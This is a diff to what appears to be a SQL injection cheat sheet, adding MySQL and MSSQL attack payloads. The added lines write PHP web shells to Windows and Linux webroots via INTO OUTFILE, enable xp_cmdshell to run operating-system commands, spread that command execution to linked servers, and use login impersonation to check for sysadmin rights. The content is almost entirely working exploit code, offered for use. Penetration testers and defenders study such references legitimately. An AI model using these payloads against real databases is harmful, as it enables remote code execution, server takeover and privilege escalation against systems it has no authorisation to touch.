@@ -260,6 +260,10 @@ UUID()                       -- UUID
 
 ```sql
 ' UNION SELECT 1,variable_name,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -
+
+-- Or from a MySQL shell:
+SHOW VARIABLES LIKE "secure_file_priv";
+-- Empty value = write allowed anywhere
 ```
 
 - Empty = can write anywhere
@@ -276,6 +280,12 @@ UUID()                       -- UUID
 
 ```sql
 ' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -
+
+-- Windows (know the webroot!)
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
+
+-- Linux
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
 
 Then access: `http://target/shell.php?0=id`
@@ -468,9 +478,45 @@ SELECT name FROM sysobjects WHERE xtype='U'
 ### Enable xp_cmdshell (RCE)
 
 ```sql
-EXEC sp_configure 'show advanced options',1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
-EXEC xp_cmdshell 'whoami';
+EXEC sp_configure 'show advanced options', '1'
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', '1'
+RECONFIGURE
+xp_cmdshell 'whoami'
+```
+
+### Execute on Linked Server
+
+```sql
+-- Check linked servers
+SELECT srvname, isremote FROM sysservers
+
+-- Execute on linked server
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LINKED.SERVER]
+
+-- Enable xp_cmdshell on linked server
+EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED.SERVER];
+
+-- Execute commands on linked server
+EXEC ('xp_cmdshell ''whoami''') AT [LINKED.SERVER];
+```
+
+### Check Impersonation Rights
+
+```sql
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+```
+
+### Impersonate User
+
+```sql
+EXECUTE AS LOGIN = 'john'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
 ### MSSQL Blind Exploitation
